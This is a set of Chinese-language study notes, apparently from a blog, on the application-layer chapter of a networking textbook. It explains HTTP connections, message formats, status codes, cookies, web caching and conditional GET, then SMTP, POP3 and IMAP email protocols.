<h2 id="1-Principles-of-Network-Applications-应用层协议原理"><a href="#1-Principles-of-Network-Applications-应用层协议原理" class="headerlink" title="1. Principles of Network Applications(应用层协议原理)"></a>1. Principles of Network Applications(应用层协议原理)</h2><h3 id="1-1-Network-Application-Architectures-网络应用程序体系结构"><a href="#1-1-Network-Application-Architectures-网络应用程序体系结构" class="headerlink" title="1.1. Network Application Architectures(网络应用程序体系结构)"></a>1.1. Network Application Architectures(网络应用程序体系结构)</h3><p>主要包括两种主流体系结构：</p>
<ul>
<li><p><strong>客户-服务器体系结构</strong>：有一个总是打开的主机称为服务器，它服务于许多来自客户主机的请求。服务器常存在于配备了大量主机的数据中心中。</p>
</li>
<li><p><strong>对等(P2P, peer to peer)体系结构</strong>：对位于数据中心的专用服务器有最小(或没有)依赖。使用这种体系的应用包括：文件共享、因特网电话、视频会议等。对于这些应用，服务器被用于跟踪用户的IP地址，但用户到用户的报文在用户主机之间直接发送，无须经过中间服务器。</p>
</li>
</ul>
<h3 id="1-2-Client-and-Server-客户与服务器"><a href="#1-2-Client-and-Server-客户与服务器" class="headerlink" title="1.2. Client and Server(客户与服务器)"></a>1.2. Client and Server(客户与服务器)</h3><p>我们可以知道，同一台主机上的不同进程，可以进行进程间通信。而不同主机(端系统)上的进程，则通过跨越计算机网络交换报文进行通信。</p>
<p>接下来，我们对相互通信的两个进程，作如下定义：</p>
<blockquote>
<p>在一对进程之间的通信会话场景中，发起通信的进程被标识为客户(client)，等待联系的进程被标识为服务器(server)。</p>
</blockquote>
<p><strong>所以，特别注意！！！在网络通信中，服务器通常指运行在目标主机上的进程(程序)。</strong> 例如，在Web应用程序中，一个浏览器(客户进程)与一个Web服务器(服务器进程)交换报文。</p>
<p>有时，我们也称<strong>应用程序的客户端和服务端</strong>。</p>
<p>那么，客户进程是如何找到服务器进程的呢？</p>
<ol>
<li><strong>目标主机</strong>由其<strong>IP地址</strong>标识。</li>
<li>目标主机上的<strong>服务器进程</strong>则由<strong>端口号</strong>来标识。端口号大小在 <code>0 ~ 65535</code> 之间，其中 <code>0 ~ 1023</code> 为周知端口号，例如，Web服务器通常用80端口号标识，邮件服务器用25端口号标识。</li>
</ol>
<h3 id="1-3-套接字"><a href="#1-3-套接字" class="headerlink" title="1.3. 套接字"></a>1.3. 套接字</h3><p>那么，进程是如何向网络发送报文的呢？是通过一个称为 <strong>套接字(socket)</strong> 的软件接口。</p>
<p>套接字是一台主机中<strong>应用层与运输层之间的接口</strong>，也是<strong>应用程序和网络之间的API</strong>。</p>
<h3 id="1-4-可供使用的运输服务和因特网提供的运输服务"><a href="#1-4-可供使用的运输服务和因特网提供的运输服务" class="headerlink" title="1.4. 可供使用的运输服务和因特网提供的运输服务"></a>1.4. 可供使用的运输服务和因特网提供的运输服务</h3><p>当开发一个应用时，必须选择一种可用的运输层协议。</p>
<p>我们通常将运输层协议提供的服务大体分为四类：</p>
<ul>
<li>**可靠数据传输(reliable data transfer)<strong>，确保数据交付的服务。能容忍数据丢失的应用，被称为</strong>容忍丢失的应用(loss-tolerant applications)**，如交谈式音频&#x2F;视频，它们能够承受一定量的数据丢失。</li>
<li>吞吐量，能够确保吞吐量恒定。具有吞吐量要求的应用，被称为**带宽敏感的应用(bandwidth-sensitive applications)<strong>；对吞吐量要求较低的应用，被称为</strong>弹性应用(elastic applications)**。</li>
<li>定时。</li>
<li>安全性。</li>
</ul>
<p>因特网提供的运输服务如下：</p>
<ul>
<li><p><strong>TCP</strong>：</p>
<ul>
<li>客户与服务器间，在握手阶段会建立TCP连接，该连接是全双工的</li>
<li>无差错、按顺序交付数据</li>
<li>拥塞控制机制，网络出现拥塞时，将会抑制发送进程</li>
</ul>
</li>
<li><p><strong>UDP</strong>：</p>
<ul>
<li>无连接的，没有握手阶段</li>
<li>不可靠数据传输、乱序到达</li>
</ul>
</li>
<li><p>**SSL(Secure Sockets Layer, 安全套接字层)**，TCP的加强版本。</p>
</li>
</ul>
<p>因特网中的常见应用及其应用层协议和支撑的运输协议：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/1.png" alt="pic"></p>
<h3 id="1-5-Application-Layer-Protocols-应用层协议"><a href="#1-5-Application-Layer-Protocols-应用层协议" class="headerlink" title="1.5. Application-Layer Protocols(应用层协议)"></a>1.5. Application-Layer Protocols(应用层协议)</h3><p>我们通过把报文(其实就是数据)发送进套接字，从而实现网络进程间的通信。但如何构造这些报文？报文中各个字段的含义是什么？这些问题将由应用层协议解决。</p>
<p><strong>应用层协议(application-layer protocol)</strong> 主要定义了：</p>
<ul>
<li>交换的报文类型</li>
<li>各种报文的语法</li>
<li>字段的语义</li>
<li>确定一个进程何时以及如何发送报文</li>
<li>对报文响应的规则</li>
</ul>
<p>部分应用层协议是由 <strong>RFC文档(包含所有互联网标准的文档)</strong> 定义的，大家都必须遵守。例如，Web的应用层协议HTTP(RFC 2616)，如果浏览器遵守HTTP协议，那它就能访问所有遵守HTTP协议的Web服务器(进程)，并获取Web页面。因此，<strong>应用层协议HTTP只是Web应用的一个部分</strong>。</p>
<p>还有部分应用协议是专用的。例如，Skype软件就使用了专用的应用层协议。</p>
<p><strong>特别注意：应用层协议是可以自定义的！用户可以编写程序调用套接字接口，直接支配运输层。此时，如果用户对传入套接字的数据进行规范，那么这个规范就是用户自定义的应用层协议。</strong></p>
<h3 id="1-6-Network-Applications-Covered-in-This-Book-本书涉及的网络应用"><a href="#1-6-Network-Applications-Covered-in-This-Book-本书涉及的网络应用" class="headerlink" title="1.6. Network Applications Covered in This Book(本书涉及的网络应用)"></a>1.6. Network Applications Covered in This Book(本书涉及的网络应用)</h3><p>在本章，将详细讨论5种重要应用：</p>
<ul>
<li>Web，使用HTTP协议</li>
<li>文件传输</li>
<li>电子邮件，使用SMTP协议</li>
<li>目录服务，使用DNS协议</li>
<li>流式视频和P2P</li>
</ul>
<h2 id="2-Web-与-HTTP-协议"><a href="#2-Web-与-HTTP-协议" class="headerlink" title="2. Web 与 HTTP 协议"></a>2. Web 与 HTTP 协议</h2><p>1990s，一个新型的因特网应用————万维网(World Wide Wed, 简称www或web)，诞生了。</p>
<p>先介绍一部分Web术语：</p>
<ul>
<li>Web页面(Web page，也叫文档)，由多个对象组成。</li>
<li><strong>对象</strong>，是一个文件，诸如一个HTML文件、一个图片或一个Java小程序。如果一个Web页面包含HTML文本和5张图片，那么这个Web页面有6个对象。</li>
<li><strong>Web浏览器</strong>，实现了HTTP的客户端。例如，谷歌、火狐、IE浏览器。通常，“客户”&#x3D;&#x3D;“浏览器”。</li>
<li><strong>Web服务器</strong>，实现了HTTP的服务端。例如，Apache、Tomcat。</li>
</ul>
<h3 id="2-1-Overview-of-HTTP"><a href="#2-1-Overview-of-HTTP" class="headerlink" title="2.1. Overview of HTTP"></a>2.1. Overview of HTTP</h3><ul>
<li><p>**HTTP(HyperText Transfer Protocol，超文本传输协议)**，是Web应用使用的应用层协议。</p>
</li>
<li><p>HTTP在 <strong>[RFC 1945]</strong> 和 <strong>[RFC 2616]</strong> 中进行定义。</p>
</li>
<li><p>HTTP定义了客户和服务器交换报文的方式，以及这些报文的结构。</p>
</li>
<li><p>HTTP使用<strong>TCP</strong>作为它的支撑运输协议。</p>
</li>
<li><p>HTTP是 <strong>无状态协议(stateless protocol)</strong> ，不存储任何关于该客户的状态信息。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/2.png" alt="pic"></p>
<h3 id="2-2-Non-Persistent-and-Persistent-Connections-非持续连接和持续连接"><a href="#2-2-Non-Persistent-and-Persistent-Connections-非持续连接和持续连接" class="headerlink" title="2.2. Non-Persistent and Persistent Connections(非持续连接和持续连接)"></a>2.2. Non-Persistent and Persistent Connections(非持续连接和持续连接)</h3><ul>
<li>非持续连接(non-persistent connections)，每个请求-响应对经过<strong>各自单独的TCP连接</strong>发送。</li>
<li>持续连接(persistent connections)，所有请求-响应对经过<strong>同一个TCP连接</strong>发送。</li>
</ul>
<h4 id="2-2-1-HTTP-with-Non-Persistent-Connections-采用非持续连接的-HTTP"><a href="#2-2-1-HTTP-with-Non-Persistent-Connections-采用非持续连接的-HTTP" class="headerlink" title="2.2.1. HTTP with Non-Persistent Connections(采用非持续连接的 HTTP)"></a>2.2.1. HTTP with Non-Persistent Connections(采用非持续连接的 HTTP)</h4><p>每个对象通过单独的TCP连接发送。</p>
<p>假设，一个Web页面包含一个HTML文件和10个图片，这11个对象位于同一台服务器上，并且该HTML文件的URL为：<code>http://www.study.com/home.index</code>。</p>
<p><strong>非持续连接的HTTP请求响应过程</strong>如下：</p>
<ol>
<li>浏览器(HTTP客户端)在80端口，向服务器<code>www.study.com</code>的80端口发起一个TCP连接。</li>
<li>HTTP客户端经它的套接字向服务器发送一个HTTP请求报文，报文中包含路径名<code>/home.index</code>。</li>
<li>HTTP服务器通过它的套接字接收到请求报文，并检索出相应对象，在HTTP响应报文中封装该对象，最后向客户发送响应报文。</li>
<li>HTTP服务器通知TCP断开连接。</li>
<li>HTTP客户端接收响应报文，TCP连接关闭。</li>
<li>对HTML文件中的每个图片对象重复上述步骤。</li>
</ol>
<p>非持续连接的缺点：</p>
<ul>
<li>必须为每个请求建立和维护全新的TCP连接，增加Web服务器负担。</li>
<li>每个对象都将经受两倍RTT(round-trip time，往返时间，分组从客户到服务器再到客户的时间)，增加总体时延。</li>
</ul>
<h4 id="2-2-2-HTTP-with-Persistent-Connections-采用持续连接的-HTTP"><a href="#2-2-2-HTTP-with-Persistent-Connections-采用持续连接的-HTTP" class="headerlink" title="2.2.2. HTTP with Persistent Connections(采用持续连接的 HTTP)"></a>2.2.2. HTTP with Persistent Connections(采用持续连接的 HTTP)</h4><p>在同个服务器上的多个对象甚至多个Web页面通过同一个TCP连接发送。</p>
<p><strong>持续连接的HTTP请求响应过程</strong>如下：</p>
<ol>
<li>浏览器(HTTP客户端)在80端口，向服务器<code>www.study.com</code>的80端口发起一个TCP连接。</li>
<li>HTTP客户端经它的套接字向服务器发送一个HTTP请求报文，报文中包含路径名<code>/home.index</code>。</li>
<li>HTTP服务器通过它的套接字接收到请求报文，并检索出相应对象，在HTTP响应报文中封装该对象，最后向客户发送响应报文。</li>
<li>对HTML文件中的每个图片对象重复2、3步骤。</li>
<li>HTTP服务器通知TCP断开连接。</li>
<li>HTTP客户端接收响应报文，TCP连接关闭。</li>
</ol>
<p>持续连接的缺点：</p>
<ul>
<li>对于现在的广泛普及的宽带连接来说，Keep-Alive也许并不像以前一样有用。web服务器会保持连接若干秒(Apache中默认15秒)，这与提高的性能相比也许会影响性能。</li>
<li>对于单个文件被不断请求的服务(例如图片存放网站)，Keep-Alive可能会极大的影响性能，因为它在文件被请求之后还保持了不必要的连接很长时间。</li>
</ul>
<p>HTTP协议发展，与非持续和持续连接：</p>
<ol>
<li><strong>HTTP&#x2F;1.0</strong> 只能使用非持续连接</li>
<li><strong>HTTP&#x2F;1.1</strong> 默认使用持续连接，可以配置非持续连接；</li>
<li><strong>HTTP&#x2F;2</strong> 允许在相同连接中多个请求和回答交错。</li>
</ol>
<h3 id="2-3-HTTP-Message-Format-HTTP-报文格式"><a href="#2-3-HTTP-Message-Format-HTTP-报文格式" class="headerlink" title="2.3. HTTP Message Format(HTTP 报文格式)"></a>2.3. HTTP Message Format(HTTP 报文格式)</h3><p>HTTP报文有两种：请求报文和响应报文。</p>
<h4 id="2-3-1-HTTP-Request-Message-HTTP-请求报文"><a href="#2-3-1-HTTP-Request-Message-HTTP-请求报文" class="headerlink" title="2.3.1. HTTP Request Message(HTTP 请求报文)"></a>2.3.1. HTTP Request Message(HTTP 请求报文)</h4><p>一个示例如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/3.png" alt="pic"></p>
<p>一个请求报文有一行或者多行，分为三部分：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/4.png" alt="pic"></p>
<ul>
<li><p>**请求行(request line)**，在第1行，有3个字段：</p>
<ul>
<li><p><strong>方法</strong>，包含以下值(前3种为HTTP1.0，后5种为HTTP1.1新增)：</p>
<ul>
<li><code>GET</code>：请求指定的页面信息，并返回实体主体。在请求URL中包含表单数据</li>
<li><code>POST</code>：在实体体中包含表单数据</li>
<li><code>HEAD</code>：当服务器收到一个HEAD请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序常用HEAD方法进行调试跟踪</li>
<li><code>PUT</code>：它允许用户上传对象到指定的Web服务器上指定的路径</li>
<li><code>DELETE</code>：允许用户删除Web服务器上的对象</li>
<li><code>CONNECT</code>：HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器</li>
<li><code>OPTIONS</code>：允许客户端查看服务器的性能</li>
<li><code>TRACE</code>：回显服务器收到的请求，主要用于测试或诊断</li>
</ul>
</li>
<li><p><strong>URL</strong>：又称统一资源定位符，其标准格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">协议类型://服务器IP地址[:需要时加上端口号]/路径/文件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTP版本：当下常见的为HTTP&#x2F;1.1</p>
</li>
</ul>
</li>
<li><p><strong>首部行(header lines)<strong>，第2~n行，每行分为</strong>首部字段名</strong>和<strong>值</strong>两个字段。常见的首部行如下：</p>
<ul>
<li><p><code>Host</code>：初始URL中的主机和端口。</p>
</li>
<li><p><code>Connection</code>：值为<code>keep-alive</code>时，表示为持续连接；值为<code>close</code>时，表示不需要持续连接。HTTP1.1默认持续连接。</p>
</li>
<li><p><code>User-Agent</code>：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</p>
</li>
<li><p><code>Accept</code>：浏览器可接受的媒体类型。如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Accept-Charset</code>：浏览器可接受的字符集。</p>
</li>
<li><p><code>Accept-Encoding</code>：浏览器能够进行解码的数据编码方式。例如：<code>Accept-Encoding: gzip, deflate, br</code></p>
</li>
<li><p><code>Accept-Language</code>：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</p>
</li>
<li><p><code>Content-Length</code>：表示请求消息正文的长度。</p>
</li>
<li><p><code>Cookie</code>：会话层信息，这是最重要的请求头信息之一。</p>
</li>
<li><p><code>If-Modified-Since</code>：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</p>
</li>
<li><p><code>Referer</code>：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</p>
</li>
</ul>
</li>
<li><p><strong>实体体(entity body)&#x2F;请求体</strong>，使用POST方法时使用该实体。</p>
</li>
</ul>
<h4 id="2-3-2-HTTP-Response-Message-HTTP-响应报文"><a href="#2-3-2-HTTP-Response-Message-HTTP-响应报文" class="headerlink" title="2.3.2. HTTP Response Message(HTTP 响应报文)"></a>2.3.2. HTTP Response Message(HTTP 响应报文)</h4><p>一个示例如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/5.png" alt="pic"></p>
<p>响应报文也分为三部分：</p>
<ul>
<li><p>**状态行(status line)**，状态行包括3个字段：</p>
<ul>
<li><p>HTTP协议版本</p>
</li>
<li><p><strong>状态码</strong>。由三个十进制数字组成，第一个数定义了状态码的类型。常见如下：</p>
<ul>
<li>1xx: 信息。服务器收到请求，需要请求者继续执行操作<ul>
<li>100 Continue: 继续。客户端应继续其请求</li>
<li><strong>101 Switching Protocols: 切换协议</strong>。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</li>
</ul>
</li>
<li>2xx: 成功。操作被成功接收并处理<ul>
<li><strong>200 OK</strong>: 请求成功。一般用于GET与POST请求</li>
</ul>
</li>
<li>3xx: 重定向。需要进一步的操作以完成请求<ul>
<li><strong>301 Moved Permanently</strong>: 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</li>
<li><strong>304 Not Modified</strong>: 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</li>
<li>305 Use Proxy: 使用代理。所请求的资源必须通过代理访问</li>
</ul>
</li>
<li>4xx: 客户端错误。请求包含语法错误或无法完成请求<ul>
<li>400 Bad Request: 客户端请求的语法错误，服务器无法理解</li>
<li><strong>403 Forbidden</strong>: 服务器理解请求客户端的请求，但是拒绝执行此请求</li>
<li><strong>404 Not Found</strong>: 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</li>
</ul>
</li>
<li>5xx: 服务器错误。服务器在处理请求的过程中发生了错误<ul>
<li><strong>500 Internal Server Error</strong>: 服务器内部错误，无法完成请求</li>
<li><strong>502 Bad Gateway</strong>: 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</li>
<li>504 Gateway Time-out: 充当网关或代理的服务器，未及时从远端服务器获取请求</li>
<li>505 HTTP Version not supported: 服务器不支持请求的HTTP协议的版本，无法完成处理</li>
</ul>
</li>
</ul>
</li>
<li><p>相应状态信息</p>
</li>
</ul>
</li>
<li><p><strong>首部行(header line)</strong></p>
<ul>
<li><code>Connection</code>：值为<code>keep-alive</code>时，表示与客户保持TCP连接；值为<code>close</code>时，告诉客户发送报文后将关闭TCP连接。</li>
<li><code>Content-Encoding</code>: 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。例如：<code>Content-Encoding：gzip</code></li>
<li><code>Content-Type</code>: 表示后面的文档属于什么MIME类型。例如：<code>Content-Type: text/html;charset=utf-8</code></li>
<li><code>Date</code>: 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li>
<li><code>Expires</code>: 响应过期的日期和时间。</li>
<li><code>Last-Modified</code>: 文档的最后改动时间。</li>
<li><code>Server</code>: 服务器名字。</li>
<li><code>Set-Cookie</code>: 设置和页面关联的Cookie。</li>
</ul>
</li>
<li><p>**实体体(entity body)**，响应给客户的数据，如HTML、图片等</p>
</li>
</ul>
<h3 id="2-4-Cookies"><a href="#2-4-Cookies" class="headerlink" title="2.4. Cookies"></a>2.4. Cookies</h3><p>众所周知，HTTP是无状态协议。<strong>cookie[RFC 6265]</strong> 在HTTP之上建立一个用户会话层，使得Web网站可以记录用户状态。网站的自动登录，大部分都是基于cookie实现的。</p>
<p>cookie包含4个部分：</p>
<ol>
<li>HTTP响应报文中的一个<code>Set-Cookie</code>首部行</li>
<li>HTTP请求报文中的一个<code>Cookie</code>首部行</li>
<li>用户浏览器储存cookie的文件。文件中的一行包括：<strong>服务器的主机名 和 服务器传来的cookie</strong></li>
<li>服务端cookie对应的数据库，又称<code>session</code></li>
</ol>
<p>示例如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/6.png" alt="pic"></p>
<h3 id="2-5-Web-Caching-Web-缓存"><a href="#2-5-Web-Caching-Web-缓存" class="headerlink" title="2.5. Web Caching(Web 缓存)"></a>2.5. Web Caching(Web 缓存)</h3><p><strong>Web缓存器(Web Cache)<strong>，也叫</strong>代理服务器(proxy server)<strong>。它通常被放置在离用户较近的地方，可以缓存用户最近请求过的对象的副本。类似于操作系统中的</strong>高速缓存</strong>。其实践的命中率通常在0.2~0.7之间。</p>
<p>Web缓存器有两大好处：</p>
<ul>
<li>可以大大减少对客户请求的响应时间</li>
<li>能从整体上减少因特网上的Web流量</li>
</ul>
<p>其工作过程如下（需要先配置浏览器指向Web缓存器）：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/7.png" alt="pic"></p>
<h3 id="2-6-The-Conditional-GET-条件-Get-方法"><a href="#2-6-The-Conditional-GET-条件-Get-方法" class="headerlink" title="2.6. The Conditional GET(条件 Get 方法)"></a>2.6. The Conditional GET(条件 Get 方法)</h3><p>**条件Get方法(conditional GET)**，允许缓存器证实它储存的对象是最新的。它有以下两个特征：</p>
<ol>
<li>请求报文使用GET方法</li>
<li>请求报文中包含<code>If-Modified-Since</code>首部行</li>
</ol>
<p>示例：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/8.png" alt="pic"></p>
<p>该条件GE报文会告诉服务器，仅当自指定日期之后该对象被修改过，才发送该对象。如果没有被修改，服务器就会返回<code>304 Not Modified</code>的响应报文。</p>
<h2 id="3-电子邮件与-SMTP-协议"><a href="#3-电子邮件与-SMTP-协议" class="headerlink" title="3. 电子邮件与 SMTP 协议"></a>3. 电子邮件与 SMTP 协议</h2><p>当因特网还在襁褓中时，电子邮件已经成为最为流行的应用程序了。</p>
<p>电子邮件系统包含三个主要组成部分：</p>
<ul>
<li><strong>用户代理(user agent)<strong>：用户写完邮件时，用户代理会将邮件发送到邮件服务器，被放置在邮件服务器的</strong>外出报文队列(Outgoing message queue)</strong> 中；用户阅读邮件时，用户代理从邮件服务器的指定邮箱中取得该报文。</li>
<li>**邮件服务器(mail server)<strong>：存放邮件的服务器，每个用户在邮件服务器上，都有一个</strong>用户邮箱(user mailbox)**，管理和维护着发送给用户的报文。负责将邮件发送到指定邮件服务器，也负责接收邮件，既是SMTP客户端，又是SMTP服务端。</li>
<li><strong>SMTP</strong>：应用层协议，使用TCP可靠数据传输服务。</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/9.png" alt="pic"></p>
<h3 id="3-1-SMTP"><a href="#3-1-SMTP" class="headerlink" title="3.1. SMTP"></a>3.1. SMTP</h3><p><strong>SMTP(Simple Mail Transfer Protocol)，又称简单邮件传输协议</strong>，问世于1982年。</p>
<p>假设Alice打算向Bob发送一封电子邮件，其步骤如下：</p>
<ol>
<li>Alice调用她的用户代理，提供Bob的邮件地址，撰写完邮件后，指示用户代理发送该报文。</li>
<li>Alice的<strong>用户代理把报文发送给她的邮件服务器，并将报文放在报文队列中</strong>。</li>
<li>运行在Alice邮件服务器上的<strong>SMTP客户端</strong>发现了报文队列中的这个报文，它就创建一个与Bob邮件服务器上SMTP服务器通信的TCP连接。</li>
<li>在经过初始SMTP握手（？？）之后，SMTP客户端通过TCP连接，发送Alice的报文。</li>
<li>Bob邮件服务器上的SMTP服务端接收该报文，并将其放入Bob的用户邮箱中。</li>
<li>在Bob方便的时候，他调用用户代理阅读该报文。</li>
</ol>
<p>如下图所示：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/10.png" alt="pic"></p>
<p>其中，<strong>SMTP通信的过程</strong>为：</p>
<ol>
<li>SMTP客户端与SMTP服务器的<strong>25端口</strong>建立一个<strong>TCP连接</strong>。</li>
<li>如果服务器没有开机，客户端会在稍后继续尝试。</li>
<li>一旦连接建立，SMTP的客户端和服务端会在传输信息前，先互相介绍，即握手阶段。握手时，SMTP客户端会指示发送方的邮件地址和接收方的邮件地址。</li>
<li>彼此介绍后，客户发送该报文。</li>
</ol>
<p>这里，解释一下，<strong>为什么不直接从用户代理将邮件报文发送到Bob的邮件服务器呢？</strong> 因为，用户代理运行在用户主机上，不可能总是尝试与一台服务器(如果服务器一直已关机的话)建立连接。</p>
<p>假设客户端(C)主机名为<code>crepes.fr</code>，服务器(S)主机名为<code>hamburger.edu</code>。一旦TCP连接创建，通信内容如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/11.png" alt="pic"></p>
<p>其中，全大写单词(<code>HELO</code>,<code>MAIL FROM</code>, <code>RCPT TO</code>, <code>DATA</code>, <code>QUIT</code>)都为“关键字”。可以看出，SMTP协议的通信规则相比HTTP简单很多。</p>
<p>而与HTTP不同的还在于，SMTP是<strong>推协议</strong>，HTTP是<strong>拉协议</strong>。</p>
<h3 id="3-2-邮件报文格式"><a href="#3-2-邮件报文格式" class="headerlink" title="3.2. 邮件报文格式"></a>3.2. 邮件报文格式</h3><p><strong>注意：这里的报文是，整个邮件报文，并不是SMTP客户端与服务端通信时的信息单位。</strong></p>
<p>邮件报文格式如下：</p>
<ul>
<li>首部：<ul>
<li><code>From:</code>首部行，必须</li>
<li><code>To:</code>首部行，必须</li>
<li><code>Subject:</code>首部行，可选</li>
<li>其它可选首部行</li>
</ul>
</li>
<li>报文体，ASCII码格式</li>
</ul>
<h3 id="3-3-邮件访问协议"><a href="#3-3-邮件访问协议" class="headerlink" title="3.3. 邮件访问协议"></a>3.3. 邮件访问协议</h3><p>一旦SMTP将邮件报文从Alice的邮件服务器交付给Bob的邮件服务器，该报文就被放入了Bob的邮箱中。那Bob是如何来阅读这封邮件的呢？</p>
<ul>
<li>从前，Bob是通过登录到服务器主机，并在主机上运行邮件阅读程序来阅读他的电子邮件的。</li>
<li>现在，邮件访问采用 客户-服务器 体系，即通过用户端系统上运行的客户程序来阅读电子邮件。</li>
</ul>
<p>在Alice发送邮件给Bob的整个过程中，Alice用户代理使用SMTP将邮件报文推入她的邮件服务器，她的邮件服务器再用SMTP将邮件报文推向Bob的邮件服务器。</p>
<p>那么，问题来了，Bob是如何通过用户代理获取他邮件服务器上的邮件的呢？必须知道的是，肯定不能使用SMTP协议，因为这是一个“推协议”。</p>
<p>而这个问题，可以用<strong>邮件访问协议</strong>来解决。流行的邮件访问协议有三种：</p>
<ul>
<li>POP3</li>
<li>IMAP</li>
<li>HTTP</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/12.png" alt="pic"></p>
<h4 id="3-3-1-POP3"><a href="#3-3-1-POP3" class="headerlink" title="3.3.1. POP3"></a>3.3.1. POP3</h4><p><strong>POP3(Post Office Protocol–Version 3)，又称第三版的邮局协议</strong>，由<code>[RFC 1939]</code>定义。</p>
<p>用户代理与服务器的<strong>110端口</strong>建立<strong>TCP连接</strong>后，就开始POP3的工作，主要包括三个阶段：</p>
<ol>
<li>特许阶段：用户代理发送（以明文形式）用户名和口令用以鉴别用户。</li>
<li>事务处理阶段：用户代理取回报文，并对报文进行下载、标记删除、取消删除标记、获取邮件统计信息等操作。</li>
<li>更新阶段：用户代理发送结束命令，会话结束，邮件服务器删除被标记为删除的报文。</li>
</ol>
<p>POP3存在的缺陷：用户可以下载邮件到本地，并创建文件夹进行管理。但是，POP3协议没有给用户提供任何创建远程文件夹，并为报文指派文件夹的方法。所以，每到一台新机器上，用户都得重新创建文件夹进行管理，这样很麻烦。</p>
<h4 id="3-3-2-IMAP"><a href="#3-3-2-IMAP" class="headerlink" title="3.3.2. IMAP"></a>3.3.2. IMAP</h4><p><strong>IMAP(Internet Mail Access Protocol)，又称因特网邮件访问协议</strong>，由<code>[RFC 3501]</code>定义。</p>
<p>相对POP3，IMAP有以下改进：</p>
<ul>
<li>IMAP服务器会把每个邮件报文与一个文件夹关联起来。允许用户创建文件夹，并移动邮件，用户可以在文件夹中阅读、删除邮件，还提供查询邮件的功能。</li>
<li>允许用户代理获取邮件报文的一部分。用户可能并不像取回他邮箱中的所有邮件，尤其是包含音频或视频的大邮件。</li>
</ul>
<h4 id="3-3-3-HTTP"><a href="#3-3-3-HTTP" class="headerlink" title="3.3.3. HTTP"></a>3.3.3. HTTP</h4><p>今天，许多邮箱提供商（如QQ邮箱），或者大学、公司，都提供了基于Web的电子邮件。</p>
